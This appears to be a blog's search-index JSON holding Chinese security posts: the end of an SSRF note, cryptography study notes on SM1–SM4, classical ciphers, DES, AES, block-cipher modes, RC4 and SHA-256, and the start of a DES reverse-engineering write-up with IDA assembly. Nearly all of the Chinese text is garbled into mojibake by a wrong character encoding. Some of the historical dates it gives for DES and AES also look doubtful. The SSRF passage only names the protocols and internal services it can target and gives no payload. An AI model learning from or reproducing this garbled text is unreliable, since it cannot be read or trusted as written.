3ï¼‰åˆ©ç”¨æœ‰è„†å¼±æ€§çš„ç»„ä»¶ç»“åˆftp://ï¼Œfile:///ï¼Œgopher://ï¼Œdict://ç­‰åè®®å®æ–½æ”»å‡»ï¼ˆå¦‚FFmpegä»»æ„æ–‡ä»¶è¯»å–ï¼ŒXXEæ”»å‡»ç­‰ï¼‰ã€‚ æ‹“å±•æ”»å‡»é¢ ç»“åˆgopheråè®®æ”»å‡»å†…ç½‘FTPã€Telnetã€Redisã€FastCGIã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œgetã€postè¯·æ±‚ã€‚","categories":[],"tags":[]},{"title":"","slug":"[ç°ä»£å¯†ç å­¦] Crypto çŸ¥è¯†ç‚¹æ€»ç»“ï¼ˆå¤å…¸å¯†ç &&å¯¹ç§°åŠ å¯†&&hashå‡½æ•°ï¼‰","date":"2021-05-08T11:05:24.607Z","updated":"2021-05-08T11:04:04.486Z","comments":true,"path":"undefined/[ç°ä»£å¯†ç å­¦] Crypto çŸ¥è¯†ç‚¹æ€»ç»“ï¼ˆå¤å…¸å¯†ç &&å¯¹ç§°åŠ å¯†&&hashå‡½æ•°ï¼‰.html","link":"","permalink":"http://k4oer.gitee.io/undefined/[%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6]%20Crypto%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81&&%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&&hash%E5%87%BD%E6%95%B0%EF%BC%89.html","excerpt":"","text":"@TOC ä¸€ . å¸¸è§åŠ è§£å¯†SM1-4å›½å¯†å³å›½å®¶å¯†ç å±€è®¤å®šçš„å›½äº§å¯†ç ç®—æ³•ã€‚ä¸»è¦æœ‰SM1ï¼ŒSM2ï¼ŒSM3ï¼ŒSM4ã€‚å¯†é’¥é•¿åº¦å’Œåˆ†ç»„é•¿åº¦å‡ä¸º128ä½ã€‚ SM1 ä¸ºå¯¹ç§°åŠ å¯†ã€‚å…¶åŠ å¯†å¼ºåº¦ä¸AESç›¸å½“ã€‚è¯¥ç®—æ³•ä¸å…¬å¼€ï¼Œè°ƒç”¨è¯¥ç®—æ³•æ—¶ï¼Œéœ€è¦é€šè¿‡åŠ å¯†èŠ¯ç‰‡çš„æ¥å£è¿›è¡Œè°ƒç”¨ã€‚ SM2ä¸ºéå¯¹ç§°åŠ å¯†ï¼ŒåŸºäºECCã€‚è¯¥ç®—æ³•å·²å…¬å¼€ã€‚ç”±äºè¯¥ç®—æ³•åŸºäºECCï¼Œæ•…å…¶ç­¾åé€Ÿåº¦ä¸ç§˜é’¥ç”Ÿæˆé€Ÿåº¦éƒ½å¿«äºRSAã€‚ECC 256ä½ï¼ˆSM2é‡‡ç”¨çš„å°±æ˜¯ECC 256ä½çš„ä¸€ç§ï¼‰å®‰å…¨å¼ºåº¦æ¯”RSA 2048ä½é«˜ï¼Œä½†è¿ç®—é€Ÿåº¦å¿«äºRSAã€‚ SM3 æ¶ˆæ¯æ‘˜è¦ã€‚å¯ä»¥ç”¨MD5ä½œä¸ºå¯¹æ¯”ç†è§£ã€‚è¯¥ç®—æ³•å·²å…¬å¼€ã€‚æ ¡éªŒç»“æœä¸º256ä½ã€‚ SM4 æ— çº¿å±€åŸŸç½‘æ ‡å‡†çš„åˆ†ç»„æ•°æ®ç®—æ³•ã€‚å¯¹ç§°åŠ å¯†ï¼Œå¯†é’¥é•¿åº¦å’Œåˆ†ç»„é•¿åº¦å‡ä¸º128ä½ã€‚ äºŒ. å¤å…¸å¯†ç ä»£æ¢å¯†ç  åˆ†ç±»ï¼š ç§»ä½ï¼ˆå‡¯æ’’ï¼‰å¯†ç  ä»¿å°„å¯†ç  å•è¡¨ä»£æ¢ å¤šè¡¨ä»£æ¢ ç½®æ¢å¯†ç  Hillå¯†ç  è½¬è½®å¯†ç æ©æ ¼ç æœº ä»£æ¢å¯†ç çš„å”¯å¯†æ–‡æ”»å‡» 1.ç»Ÿè®¡æ”»å‡» 2.é‡åˆæŒ‡æ•°æ³•ä¾‹é¢˜ å¯†ç åˆ†æå¯åˆ†ä¸ºé‚£å‡ ç±»ï¼Œå®ƒä»¬çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿæ ¹æ®å¯†ç åˆ†æè€…å¯èƒ½å–å¾—çš„åˆ†æèµ„æ–™çš„ä¸åŒï¼Œå¯†ç åˆ†æï¼ˆæˆ–ç§°æ”»å‡»ï¼‰å¯åˆ†ä¸ºä¸‹åˆ—å››ç±»ï¼š1ï¼‰å”¯å¯†æ–‡åˆ†æï¼ˆæ”»å‡»ï¼‰ï¼Œå¯†ç åˆ†æè€…å–å¾—ä¸€ä¸ªæˆ–å¤šä¸ªç”¨åŒä¸€å¯†é’¥åŠ å¯†çš„å¯†æ–‡ï¼›2ï¼‰å·²çŸ¥æ˜æ–‡åˆ†æï¼ˆæ”»å‡»ï¼‰ï¼Œé™¤è¦ç ´è¯‘çš„å¯†æ–‡å¤–ï¼Œå¯†ç åˆ†æè€…è¿˜å–å¾—ä¸€äº›ç”¨åŒä¸€å¯†é’¥åŠ å¯†çš„æ˜å¯†æ–‡å¯¹ï¼›3ï¼‰é€‰æ‹©æ˜æ–‡åˆ†æï¼ˆæ”»å‡»ï¼‰ï¼Œå¯†ç åˆ†æè€…å¯å–å¾—ä»–æ‰€é€‰æ‹©çš„ä»»ä½•æ˜æ–‡æ‰€å¯¹åº”çš„å¯†æ–‡ï¼ˆå½“ç„¶ä¸åŒ…æ‹¬ä»–è¦æ¢å¤çš„æ˜æ–‡ï¼‰ï¼Œè¿™äº›æ˜å¯†æ–‡å¯¹å’Œè¦ç ´è¯‘çš„å¯†æ–‡æ˜¯ç”¨åŒä¸€å¯†é’¥åŠ å¯†çš„ï¼›4ï¼‰é€‰æ‹©å¯†æ–‡åˆ†æï¼ˆæ”»å‡»ï¼‰ï¼Œå¯†ç åˆ†æè€…å¯å–å¾—ä»–æ‰€é€‰æ‹©çš„ä»»ä½•å¯†æ–‡æ‰€å¯¹åº”çš„æ˜æ–‡ï¼ˆè¦ç ´è¯‘çš„å¯†æ–‡é™¤å¤–ï¼‰ï¼Œè¿™äº›å¯†æ–‡å’Œæ˜æ–‡å’Œè¦ç ´è¯‘çš„å¯†æ–‡æ˜¯ç”¨åŒä¸€è§£å¯†å¯†é’¥è§£å¯†çš„ï¼Œå®ƒä¸»è¦åº”ç”¨äºå…¬é’¥å¯†ç ä½“åˆ¶ã€‚ ç§»ä½å¯†ç ï¼Œä»¿å°„å¯†ç ï¼Œå•è¡¨ä»£æ¢å¯†ç éƒ½æ²¡æœ‰ç ´åæ˜æ–‡çš„é¢‘ç‡ç»Ÿè®¡è§„å¾‹ï¼Œå¯ä»¥ç›´æ¥ç”¨ç»Ÿè®¡åˆ†ææ³• å­—æ¯é¢‘ç‡åˆ†ææ³•å¯¹ï¼ˆå•è¡¨ä»£æ¢å¯†ç ï¼‰ç®—æ³•æœ€æœ‰æ•ˆä¾‹é¢˜ ä¸‰. å¯¹ç§°åŠ å¯†ç®—æ³•12å¼•è‡ªåˆå¤©ç½‘å®‰å®éªŒå®¤ï¼šhttps:&#x2F;&#x2F;www.hetianlab.com&#x2F;expc.do?ce&#x3D;7bbc91e0-a9b3-4af9-a108-ce94117ee430ä»¥åŠç°ä»£å¯†ç å­¦ï¼ˆè°·åˆ©æ³½ç‰ˆï¼‰ åˆ†ç»„å¯†ç è®¾è®¡æ€æƒ³ï¼š æ··æ·†ï¼šæ˜æ–‡/å¯†é’¥å’Œå¯†æ–‡ä¹‹é—´çš„å…³ç³»å¤æ‚ åˆ†ç»„ï¼šæ˜æ–‡/å¯†é’¥çš„æ¯ä¸€ä¸ªæ¯”ç‰¹éƒ½å½±å“å¯†æ–‡çš„æ¯ä¸€ä¸ªæ¯”ç‰¹DESç®—æ³•ï¼ˆæ•°æ®åŠ å¯†æ ‡å‡†ï¼‰1. Feistelç»“æ„æ˜æ–‡å’Œå¯†æ–‡åˆ†ç»„é•¿åº¦ä¸º64Bitï¼Œå¯†é’¥é•¿åº¦56bitï¼ˆå¯†é’¥ç©ºé—´2^56ï¼‰ç®—æ³•åŒ…æ‹¬ï¼šè¿­ä»£åŠ å¯†å’Œå¯†é’¥ç¼–æ’ IPç½®æ¢ï¼ˆåˆå§‹ç½®æ¢ï¼‰æ ¹æ®åˆå§‹ç½®æ¢è¡¨ï¼Œå°†æ˜æ–‡æ•°æ®ç§»åˆ°è¯¥æ•°æ®æ‰€åœ¨ä½ç½®ä»ä¸Šè¡¨æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºï¼Œåˆå§‹ç½®æ¢è¡¨çš„è§„å¾‹å…¶å®å°±æ˜¯ï¼ˆå…¶å®ä¸ç”¨å¤ªåœ¨æ„è¿™ä¸ªè§„å¾‹ï¼‰ï¼ša. å¶æ•°ä¸å¥‡æ•°åˆ†å¼€ï¼ˆ1~64ï¼‰ï¼Œç„¶ååˆ†ä¸ºä¸Šä¸‹ä¸¤éƒ¨åˆ†ï¼Œåˆ†å¸ƒåœ¨ç½®æ¢è¡¨ä¸­ï¼Œå¶æ•°åœ¨ä¸Šï¼Œå¥‡æ•°åœ¨ä¸‹ã€‚ b. åœ¨å¶æ•°ä¸å¥‡æ•°å†…éƒ¨ï¼Œåˆéµä»â€œä»å³åˆ°å·¦ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä»å°åˆ°å¤§â€çš„æ’åˆ—ã€‚ å®é™…ä¸­åŠ å¯†çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œä¸ºç›´è§‚å±•ç¤ºè¿™é‡Œç”¨å­—æ¯ä»£æ›¿ç½®æ¢å®Œè‡³æ­¤æˆ‘ä»¬ä¾¿å¾—åˆ°äº†åˆå§‹ç½®æ¢ä¹‹åçš„æ•°æ® Data=â€œ5XPHzrjb7ZRJBtld91TLDvnf=3VNFxph4WOGyqia6YQI(i)Askc80SKCume+2UMEwogâ€ L0 = â€œ5XPHzrjb7ZRJBtld91TLDvnf=3VNFxphâ€ R0 = â€œ4WOGyqia6YQI(i)Askc80SKCume+2UMEwogâ€ 2. è½®å‡½æ•°å‡½æ•° fä¸»è¦å¯¹æ•°æ®å³åŠéƒ¨åˆ†Rè¿›è¡Œæ“ä½œ a. å…ˆå¯¹å…¶è¿›è¡Œæ‰©å±•ç½®æ¢ï¼Œä½¿å…¶å˜ä¸º48ä½çš„æ•°æ®ï¼Œ b. ç„¶åç”Ÿæˆçš„æ•°æ®å†ä¸å­å¯†é’¥è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œ c. å†ä»¥å¼‚æˆ–è¿ç®—åçš„48ä½æ•°æ®è¿›è¡ŒSç›’ä»£æ›¿ï¼Œå°†48ä½çš„æ•°æ®ï¼Œè½¬æ¢ä¸º32ä½çš„æ•°æ®ï¼Œ d. å†è¿›è¡ŒPç›’ç½®æ¢ï¼Œç”Ÿæˆ32ä½çš„æ•°æ® e. æœ€åå°†Pç›’ç½®æ¢ç”Ÿæˆçš„æ•°æ®ä¸æœ¬è½®è¿ç®—çš„Lè¿›è¡Œå¼‚æˆ–ï¼Œç”Ÿæˆæ–°çš„Rã€‚ f. è€Œæ–°çš„Læ˜¯ç›´æ¥ç”±æœ¬è½®çš„Rè¿›è¡Œæ›¿æ¢ 3. å¯†é’¥ç¼–æ’ç®—æ³• å­å¯†é’¥Kçš„ç”Ÿæˆå‡è®¾åˆå§‹64ä½å¯†é’¥ï¼šâ€œabcdefgh ijklmnop qrstuvwx yzABCDEF GHIJKLMN OPQRSTUV WXYZ0123 456789+=â€çº¢è‰²éƒ¨åˆ†ä¸ºå¥‡å¶æ ¡éªŒä½ï¼Œä¸å‚ä¸åŠ å¯†ç®—æ³• åˆå§‹å‹ç¼©ç½®æ¢åï¼šå¯ä»¥çœ‹å‡ºå‹ç¼©ç½®æ¢1çš„è§„å¾‹ï¼š å‹ç¼©ç½®æ¢1æ¥ä¸‹æ¥çš„æ˜¯æ‹†åˆ†ï¼š K0=â€œ4WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ+2UMEwog91TLDvnf80SKCumeBtldâ€ C0=â€œ4WOGyqia5XPHzrjb6YQI(i)Askc7ZRJâ€ D0=â€œ+2UMEwog91TLDvnf80SKCumeBtldâ€ æ‹†åˆ†ä¹‹åæˆ‘ä»¬å¾—åˆ°C0ã€D0ï¼Œå†ç„¶åå°±æ˜¯å¾ªç¯å·¦ç§»ï¼Œæ±‚å‡ºC1ã€D1ï¼š æ ¹æ®â€è½®æ•°å’Œå·¦ç§»ä½æ•°â€çš„å¯¹åº”è¡¨ï¼Œç¬¬ä¸€è½®å¾—åˆ° 123C1&#x3D;â€œWOGyqia5XPHzrjb6YQI(i)Askc7ZRJ4â€D1&#x3D;â€œ2UMEwog91TLDvnf80SKCumeBtld+â€ å¦‚ä¸Šï¼Œå·¦ç§»çš„åŒæ—¶è¿˜è¦ä¿æŒä½æ•°ä¸å˜ï¼Œæ‰€ä»¥ç§»åŠ¨çš„æ•°æ®åˆè¡¥å……åˆ°åé¢ã€‚ C1D1= â€œWOGyqia5XPHzrjb6YQI(i)Askc7ZRJ42UMEwog91TLDvnf80SKCumeBtld+â€ å‹ç¼©ç½®æ¢2 å¾—åˆ°å­å¯†é’¥K1K1=â€œjYH7WqG4bisPcI(i)zyR56aJArOvBM1KdUDe0wC8uL+otSnm92Eâ€ æ‰©å±•ç½®æ¢Eå°†æ•°æ®Rï¼ˆ32ä½ï¼‰ï¼ŒæŒ‰ç…§æ¯4ä½ä¸€ç»„ï¼Œæ‹†åˆ†æˆ8ä¸ªç»„ï¼Œå¦‚å›¾ï¼Œå·¦å³é»‘è‰²çš„ä¸¤åˆ—æ˜¯æ‰©å±•æ—¶æ·»åŠ çš„æ•°æ®ï¼Œä¸­é—´çš„å°±æ˜¯åˆ†ç»„åçš„æ•°æ®Rï¼Œè¡¨ä¸­çš„æ•°å­—ä»£è¡¨æ•°æ®Rä¸­çš„ä½ç½®ã€‚åˆ†æˆ8ç»„ç»‡åï¼Œéµå¾ªè¿™æ ·çš„ä¸€ä¸ªè§„åˆ™ï¼šæ¯ä¸€ç»„çš„å¤´éƒ¨æ·»åŠ æœ¬ç»„æ•°æ®ä¸Šä¸€ç»„çš„å°¾éƒ¨ï¼Œæ¯ä¸€ç»„çš„å°¾éƒ¨æ·»åŠ æœ¬ç»„æ•°æ®ä¸‹ä¸€ç»„çš„å¤´éƒ¨ã€‚å³ç¬¬ä¸€ç»„æ•°æ®ï¼Œå‰é¢æ·»åŠ çš„æ˜¯æœ€åä¸€ç»„çš„æœ€åä¸€ä½æ•°æ®ï¼Œåé¢æ·»åŠ çš„æ˜¯ç¬¬äºŒç»„çš„ç¬¬ä¸€ä½æ•°æ®â€¦ä»¥æ­¤ç±»æ¨å› æ­¤ï¼Œå¯¹R0è¿›è¡Œæ‰©å±•ç½®æ¢R0=â€œ4WOGyqia6YQI(i)Askc80SKCume+2UMEwogâ€ä¹‹åæˆ‘ä»¬ä¾¿å¾—åˆ°äº†æ‰©å±•åˆ°48ä½çš„R0ï¼š R0=â€œg4WOGYGYqia6a6YQI(i)AI(i)Askc8c80SKCKCume+e+2UMEMEwog4â€ æ‰©å±•ç½®æ¢Eç»“æŸä¹‹åï¼Œæˆ‘ä»¬è¦è¿›è¡Œçš„å°±æ˜¯K1ä¸R0çš„å¼‚æˆ–è¿ç®— Sç›’ä»£æ›¿Sç›’ä»£æ›¿çš„ä½œç”¨ï¼Œå°±æ˜¯å°†æˆ‘ä»¬ä¸Šä¸€æ­¥ï¼ŒR0ä¸K1å¼‚æˆ–åå¾—åˆ°çš„48ä½æ•°æ®å‹ç¼©ä¸º32ä½æ•°æ®ã€‚ æˆ‘ä»¬å‰é¢æ‰©å±•ç½®æ¢åå¾—åˆ°çš„R0æ˜¯48ä½çš„æ•°æ®ï¼Œæˆ‘ä»¬çš„Sç›’æœ‰8ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å°†å¾—åˆ°çš„R0å¹³å‡åˆ†ä¸º8ç»„ï¼Œæ¯ç»„å¯¹åº”ä¸€ä¸ªSç›’ã€‚æ¯ä¸€ç»„çš„æ•°æ®é•¿åº¦ä¸º6ä½ï¼Œå‡è®¾ç¬¬ä¸€ç»„çš„äºŒè¿›åˆ¶æ•°æ®ä¸ºï¼šâ€œ100110â€é‚£ä¹ˆï¼Œæˆ‘ä»¬å–ç¬¬ä¸€ä½ä¸æœ€åä¸€ä½ï¼Œç»„æˆè¡Œæ•°ï¼šâ€œ10â€=2å–ä¸­é—´å››ä½ï¼Œç»„æˆåˆ—æ•°ï¼šâ€œ0011â€=3é‚£ä¹ˆï¼Œåœ¨å¯¹åº”çš„S1ç›’ä¸­ï¼Œå–2è¡Œ3åˆ—çš„æ•°æ®ï¼ˆç¬¬3è¡Œç¬¬4åˆ—ï¼‰ï¼š8ï¼Œè½¬æ¢ä¸º2è¿›åˆ¶ï¼šâ€œ1000â€é‚£ä¹ˆå°±å°†è¿™ä¸ªå¾—åˆ°çš„4ä½äºŒè¿›åˆ¶æ•°æ®ï¼Œä»£æ›¿åŸæ¥ç¬¬ä¸€ç»„çš„6ä½æ•°æ®ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç­‰8ä¸ªSç›’å…¨éƒ¨ä»£æ›¿å®Œæ¯•ï¼Œæˆ‘ä»¬å°±å¾—åˆ°32ä½çš„æ•°æ®ã€‚ Pç›’ç½®æ¢è‡³æ­¤æˆ‘ä»¬ä¾¿å¾—åˆ°äº†f(R0,K1),åªè¦å†ä¸L0è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°±å¾—åˆ°äº†ç¬¬ä¸€è½®è¿ç®—æœ€ç»ˆçš„R1ï¼Œç„¶åå†å°†R0çš„å€¼èµ‹ç»™L1ï¼Œå°±å®Œæˆäº†ç¬¬ä¸€è½®çš„è¿ç®—ï¼Œå¾—åˆ°äº†L1,R1ã€‚ 4. æœ«ç½®æ¢ ç»è¿‡16æ¬¡çš„è¿ç®—ï¼Œæˆ‘ä»¬åœ¨å‡½æ•°fçš„æœ€åï¼Œä¼šå¾—åˆ°â€œL16ã€R16â€ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œç„¶åå°†L16ä¸R16åˆå¹¶ï¼Œä½†æ˜¯ä¸ä¹‹å‰çš„æ­¥éª¤ä¸­çš„åˆå¹¶ä¸åŒï¼Œæ­¤æ¬¡åˆå¹¶éœ€è¦å…ˆäº¤æ¢äºŒè€…çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯åº”è¯¥æ˜¯R16 L16ã€‚ 5. å®‰å…¨å¢å¼ºï¼ˆ1ï¼‰ç©·ä¸¾æœç´¢æ”»å‡»ç›®æ ‡ï¼šç»™å®šè¾“å…¥è¾“å‡ºå¯¹ (m i , c i = E(k, m i )) i=1,..,3 ï¼Œå¯»æ‰¾å¯†é’¥ k.ï¼ˆ2ï¼‰3DES 1234ä»¤ E : K Ã— M -&gt; M æ˜¯ä¸€ä¸ªåˆ†ç»„å¯†ç å®šä¹‰ 3E: K^3 Ã— M -&gt;M ä¸º 3E ( (k 1 ,k 2 ,k 3 ), m ) &#x3D;E(k 3 ,E (k 2 , E(k 1 , m)))å¯†é’¥é•¿åº¦ &#x3D; 3 Ã— 56 &#x3D; 168 bits ( ç©·ä¸¾æ”»å‡»å¤æ‚åº¦â‰ˆ2 ^118) å‚è€ƒæ–‡ç« : DES å®‰å…¨æ€§&amp;3DES , ä¸‰é‡DESåŸç† AESç®—æ³•ï¼ˆé«˜çº§åŠ å¯†æ ‡å‡†ï¼‰å¯¹ç§°åŠ å¯†æµç¨‹åˆ†ç»„åŠ å¯†ç®—æ³•ï¼šæ˜æ–‡ï¼ˆ128/256bit)å’Œå¯†æ–‡åˆ†ç»„ï¼ˆ128/192/256bit)å¯å˜é•¿åº¦SPNç»“æ„ï¼šè½®å‡½æ•°åŒ…æ‹¬ï¼šä»£æ¢å±‚-ç½®æ¢å±‚-å¯†é’¥æ··åˆå±‚å¯†é’¥é•¿åº¦ï¼š128bitï¼ˆå¯†é’¥ç©ºé—´2^128) 10è½® åŒ…å«4ä¸ªæ­¥éª¤ å­—èŠ‚ä»£æ›¿ å­—èŠ‚ä»£æ›¿ï¼ˆSubBytesï¼‰çš„ç›®çš„æ˜¯é€šè¿‡Sç›’å®Œæˆä¸€ä¸ªå­—èŠ‚åˆ°å¦å¤–ä¸€ä¸ªå­—èŠ‚çš„æ˜ å°„è½¬æ¢ï¼Œå­—èŠ‚æ›¿æ¢ä¸ºè¿™ä¸ªå¯†ç ç³»ç»Ÿæä¾›äº†æ›¿æ¢æ€§ã€‚ è¡Œç§»ä½è¡Œç§»ä½ï¼ˆShiftRowsï¼‰æ­¥éª¤è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½å‘å·¦å¾ªç¯ä½ç§»æŸä¸ªåç§»é‡ã€‚åœ¨AESä¸­ï¼ˆåŒºå—å¤§å°128ä½ï¼‰ï¼Œç¬¬ä¸€è¡Œç»´æŒä¸å˜ï¼Œç¬¬äºŒè¡Œé‡Œçš„æ¯ä¸ªå­—èŠ‚éƒ½å‘å·¦å¾ªç¯ç§»åŠ¨ä¸€æ ¼ï¼Œç¬¬ä¸‰è¡Œé‡Œçš„æ¯ä¸ªå­—èŠ‚éƒ½å‘å·¦å¾ªç¯ç§»åŠ¨äºŒæ ¼ï¼Œç¬¬å››è¡Œé‡Œçš„æ¯ä¸ªå­—èŠ‚éƒ½å‘å·¦å¾ªç¯ç§»åŠ¨ä¸‰æ ¼ã€‚ç»è¿‡è¡Œç§»ä½ä¹‹åï¼ŒçŸ©é˜µä¸­æ¯ä¸€ç«–åˆ—ï¼Œéƒ½æ˜¯ç”±è¾“å…¥çŸ©é˜µä¸­çš„æ¯ä¸ªä¸åŒåˆ—ä¸­çš„å…ƒç´ ç»„æˆã€‚ åˆ—æ··æ·†è¿™é‡Œæœ‰ä¸€ä¸ªé”™è¯¯ï¼Œåˆå§‹çŸ©é˜µä¸ºï¼Œå¦å¤–åˆ—æ··æ·†ä¸­ç¬¬äºŒé¡¹02Â·6E=11011100æœ‰é™åŸŸä¸Šçš„å­—èŠ‚è¿ç®—ï¼š è½®å¯†é’¥åŠ  AESçš„å¯†é’¥ç¼–æ’ç®—æ³• å¯†é’¥æ‰©å±•ï¼šAESçš„è§£å¯†å˜æ¢ åˆ†ç»„å¯†ç çš„è¿è¡Œæ¨¡å¼1. ECBæ¨¡å¼ 2. CBCæ¨¡å¼ 3. CFBæ¨¡å¼åé¦ˆæ˜¯æŒ‡å‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„çš„å€¼ä¼šè¢«é€åˆ°å¯†ç ç®—æ³•çš„è¾“å…¥ç«¯ã€‚åœ¨ECBæ¨¡å¼å’ŒCBCæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„éƒ½æ˜¯é€šè¿‡å¯†ç ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œç„¶è€Œï¼Œåœ¨CFBæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„å¹¶æ²¡æœ‰é€šè¿‡å¯†ç ç®—æ³•æ¥ç›´æ¥è¿›è¡ŒåŠ å¯†ã€‚ æ˜æ–‡åˆ†ç»„å’Œå¯†æ–‡åˆ†ç»„ä¹‹é—´å¹¶æ²¡æœ‰ç»è¿‡â€œåŠ å¯†â€è¿™ä¸€æ­¥éª¤ã€‚ï¼ˆåŠ è§£å¯†è¿‡ç¨‹åªè°ƒç”¨åŠ å¯†ç®—æ³•è¿™ä¸€ä¸ªè¿‡ç¨‹ï¼‰åœ¨CFBæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„å’Œå¯†æ–‡åˆ†ç»„ä¹‹é—´åªæœ‰ä¸€ä¸ªXORã€‚jé€šå¸¸ä¸º8 å‚è€ƒæ–‡ç« ï¼šCFBåŸç† 4. CTRæ¨¡å¼ï¼ˆè®¡æ•°å™¨ï¼‰ ä¾‹é¢˜ 1977å¹´1æœˆ DESæ­£å¼æˆä¸ºç¾å›½è”é‚¦æ”¿åºœä¿¡æ¯å¤„ç†æ ‡å‡†ï¼Œå³FIPS-46æ ‡å‡†ï¼Œ1997å¹´æ’¤é”€ï¼Œé‡‡ç”¨AESç®—æ³•ï¼Œæ–°ç®—æ³•çš„åˆ†ç»„é•¿åº¦ä¸º128æ¯”ç‰¹ï¼Œæ”¯æŒå¯å˜å¯†é’¥é•¿åº¦128ï¼Œ192ï¼Œ256æ¯”ç‰¹ã€‚1999å¹´æœ€ç»ˆé€‰å®šRijndanelç®—æ³•ä¸ºæ–°çš„æ•°æ®åŠ å¯†æ ‡å‡†ã€‚ WAPIæ ‡å‡†æ˜¯ä¸­å›½é¢å¸ƒçš„æ— çº¿å±€åŸŸç½‘å®‰å…¨å›½å®¶æ ‡å‡† æµå¯†ç æµå¯†ç æ ¸å¿ƒï¼šä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRGï¼‰ LFSR ï¼šçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆä¸ºçº¿æ€§å‡½æ•°ï¼‰å¯†é’¥æµ{k}çš„å‘¨æœŸä¸€å®šè¦å¤§ ä¾‹é¢˜ï¼š RC4ç®—æ³•ï¼ˆåºåˆ—å¯†ç ï¼‰ KSA 123456789//S è¡¨éšæœºåŒ–s[i] æ•°æ®t[i] å¯†é’¥j = 0i = 0for i in range(n): j = (j+s[i]+t[i])%n; s[i],s[j]=s[j],s[i]; PRGA(ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ï¼‰12345i = (i+1)%nj = (j+s[i])%nswap(s[i],s[j])t = (s[i]+s[j])%nk = s[t] RC4åº”ç”¨ ä¾‹é¢˜13. ä¸€èˆ¬çš„ï¼Œä¸€ä¸ªåé¦ˆç§»ä½å¯„å­˜å™¨ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šç§»ä½å¯„å­˜å™¨å’Œåé¦ˆå‡½æ•° å››. Hashå‡½æ•°SHA-256ç®—æ³• ä¾‹é¢˜hashå‡½æ•°çš„æŠ—äºŒæ¬¡åŸåƒæ€§ï¼šå¯¹äºç»™å®šçš„æ¶ˆæ¯M1ï¼Œå‘ç°å¦ä¸€ä¸ªæ¶ˆæ¯M2ï¼Œä½¿å¾—H(M1)=H(M2)åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚æŠ—ç¢°æ’æ€§ï¼šæ‰¾åˆ°ä»»æ„ä¸€å¯¹ä¸åŒçš„M1å’ŒM2ï¼Œä½¿å¾—Hï¼ˆM1ï¼‰=Hï¼ˆM2ï¼‰åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚","categories":[],"tags":[]},{"title":"DESç®—æ³•é€†å‘åˆ†æ","slug":"DESç®—æ³•é€†å‘åˆ†æ","date":"2021-05-04T16:00:00.000Z","updated":"2021-05-05T13:09:25.576Z","comments":true,"path":"undefined/DESç®—æ³•é€†å‘åˆ†æ.html","link":"","permalink":"http://k4oer.gitee.io/undefined/DES%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html","excerpt":"","text":"DESç®—æ³•é€†å‘åˆ†æå‰è¨€ï¼šäº†è§£DESç®—æ³•çš„åŸºæœ¬æµç¨‹ï¼š ä¸€. ç”¨IDAæ‰“å¼€ï¼Œå¾—åˆ°æ±‡ç¼–ä»£ç  äºŒ. é€å±‚åˆ†æ1. æ•´ä½“åˆå§‹åŒ– rep stosdä¹‹å‰ä¸ºæ ˆçš„åˆå§‹åŒ–ï¼Œä¸ºç¨‹åºåˆ†é…æ ˆç©ºé—´ 123456mov eax, ds:dword_428458 mov dword ptr [ebp+var_C], eax mov ecx, ds:dword_42845Cmov dword ptr [ebp+var_C+4], ecxmov dl, ds:byte_428460mov [ebp+var_C+8], dl å°†dword_428458çš„å€¼â€™_3EDâ€™å’Œdword_42845cçš„å€¼â€™C1nEâ€™åˆ†é…åˆ°ptr [ebp+var_C+8]æ•°ç»„ç©ºé—´ä¸­ï¼Œå¹¶ä¸”æŒ‰ç…§å°ç«¯å­˜å‚¨æ–¹å¼ï¼Œæœ€ç»ˆçš„æ•°ç»„å†…å®¹ä¸ºâ€™DE3_En1Câ€™(å³ä¸ºåˆå§‹å¯†é’¥) æ¥ä¸‹æ¥ä¸ºè°ƒç”¨scanfå‡½æ•°ï¼ŒæŒ‰ç…§è¦æ±‚â€˜give me a string to encryptâ€™ è¾“å…¥ä¸€ä¸²å­—ç¬¦Str,åˆ¤æ–­Stré•¿åº¦ï¼Œå¦‚æœé•¿åº¦ä¸º8åˆ™è·³è½¬åˆ° short loc_40111D 1234call _strlenadd esp, 4cmp eax, 8jz short loc_40111D å¦åˆ™æ‰§è¡Œsystem(â€˜pauseâ€™)æŒ‡ä»¤,ä»¤eaxçš„å€¼ä¸º-1ï¼Œå¹¶è·³è½¬åˆ°loc_4011A6 12345push offset Command ; &quot;pause&quot;call _systemadd esp, 4or eax, 0FFFFFFFFhjmp loc_4011A6 ä¹‹åè¿›è¡Œæ•´ä¸ªå‡½æ•°æ ˆçš„é”€æ¯ 2. ä¸»å‡½æ•°åˆ†æ è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œé¦–å…ˆå¯¹call sub_40100Fåˆ†æï¼Œè¿›å…¥å‡½æ•° 